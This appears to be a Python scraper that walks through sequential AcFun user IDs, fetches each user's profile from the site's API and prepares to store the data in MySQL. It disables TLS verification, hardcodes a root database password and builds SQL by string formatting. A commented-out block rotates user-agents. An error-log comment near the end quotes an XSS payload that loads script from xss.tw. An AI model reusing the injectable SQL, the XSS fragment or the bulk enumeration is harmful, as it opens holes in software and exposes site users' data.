#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time : 2018/12/27 17:35
# @Author : LiangJiangHao
# @Software: PyCharm
import os
import requests
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning
# 禁用安全请求警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import pymysql
from lxml import html

# CREATE TABLE `up_baseInfor` (
#   `Id` INT(11) NOT NULL AUTO_INCREMENT,
#   `userid` INT(11) NOT NULL COMMENT '用户id',
#   `userImg` VARCHAR(255) DEFAULT NULL COMMENT '用户头像',
#   `user_name` VARCHAR(255) DEFAULT NULL COMMENT'用户名',
#   `followed` INT(11) DEFAULT NULL COMMENT '粉丝数',
#   `bananaGold` INT(11) DEFAULT NULL COMMENT '金香蕉',
#   PRIMARY KEY (`Id`)
# ) ENGINE=INNODB DEFAULT CHARSET=utf8mb4 COMMENT='a站用户表';

connect = pymysql.Connect(
    host='127.0.0.1',
    port=3306,
    user='root',
    passwd='123456',
    db='ac_up',
    charset='utf8mb4',
    cursorclass=pymysql.cursors.DictCursor

)
cursor = connect.cursor()
def insertChatContent(userid,userImg,user_name,followed,bananaGold):
    # 连接数据库
    connect = pymysql.Connect(
        host='127.0.0.1',
        port=3306,
        user='root',
        passwd='123456',
        db='ac_up',
        charset='utf8mb4'
    )
    # 获取游标
    cursor = connect.cursor()
    sql="REPLACE into up_baseInfor (userid,userImg,user_name,followed,bananaGold)  values ('%s','%s', '%s','%s','%s')"%(userid,userImg,user_name,followed,bananaGold)
    cursor.execute(sql)
    connect.commit()

for x in range(4770000,4780000):
    # API记录数据
    try:
        userid='%s'%x
        header_dict = {'deviceType': '0'}
        url='https://apipc.app.acfun.cn/v2/user/content/profile?app_version=5.10.2&market=appstore&origin=ios&resolution=750x1334&sys_name=ios&sys_version=12.0&userId=%s'%userid
        response=requests.get(url,headers=header_dict,verify=False).content
        result = json.loads(response)
        userImg=result['vdata']['userImg']
        userName=result['vdata']['username']
        fenceNum=result['vdata']['followed']
        bananaGold=result['vdata']['bananaGold']
        sqlStr='%s,%s,%s,%s,%s'%(userid,userImg,userName,fenceNum,bananaGold)
        # print(sqlStr)
        print('正在抓取第%s条数据:%s,%s,%s,%s'%(str(x),userid,userName,fenceNum,bananaGold))
        if int(fenceNum)>1000:
            print('*************************************************************')
            print(userid)
        # insertChatContent(userid,userImg,userName,fenceNum,bananaGold)
    except Exception as e:
        # print(e)
        continue

    # try:
    #     userid='%s'%x
    #     print(userid)
    #     header_dict = {'deviceType': '0'}
    #     url='http://www.acfun.cn/u/%s.aspx'%userid
    #     response=requests.get(url,headers=header_dict,verify=False).content
    #     selector = html.fromstring(response)
    #     imgArr = selector.xpath('//img/@src')
    #     for img in imgArr:
    #         print(img)
    #     break
    #     # result = json.loads(response)
    #     # userImg=result['vdata']['userImg']
    #     # userName=result['vdata']['username']
    #     # fenceNum=result['vdata']['followed']
    #     # bananaGold=result['vdata']['bananaGold']
    #     # sqlStr='%s,%s,%s,%s,%s'%(userid,userImg,userName,fenceNum,bananaGold)
    #     # # print(sqlStr)
    #     # print('正在抓取第%s条数据:%s,%s,%s,%s'%(str(x),userid,userName,fenceNum,bananaGold))
    #     # insertChatContent(userid,userImg,userName,fenceNum,bananaGold)
    # except Exception as e:
    #     # print(e)
    #     continue

# 224090
# 236600 12000/30 400/1min  6.6/1s
# 12.20 23w
# 12.43 246730 210min 298259 52000
# 6000 1min   36w/h 100/s
# 20.18 start
# 22.30 12w

        #这句话用于随机选择user-agent
    #     ua = random.choice(self.user_agent_list)
    #     if ua:
    #         request.headers.setdefault('User-Agent', ua)
    #
    # #the default user_agent_list composes chrome,I E,firefox,Mozilla,opera,netscape
    # user_agent_list = [\
    #     "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"\
    #     "Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",\
    #     "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",\
    #     "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6",\
    #     "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1",\
    #     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",\
    #     "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5",\
    #     "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",\
    #     "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",\
    #     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",\
    #     "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",\
    #     "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",\
    #     "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",\
    #     "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",\
    #     "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",\
    #     "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3",\
    #     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24",\
    #     "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"
    #    ]

# pymysql.err.ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'auth_key=')!=-1){x=document.createElement('script');x.src='http://xss.tw/1559';d'

# url1='https://apipc.app.acfun.cn/v2/user/album?app_version=5.10.2&market=appstore&origin=ios&pageNo=1&pageSize=20&resolution=750x1334&sort=0&status=2&sys_name=ios&sys_version=12.0&userId=5322091'
# url2='https://apipc.app.acfun.cn/v2/videos/4820253'

# 4688622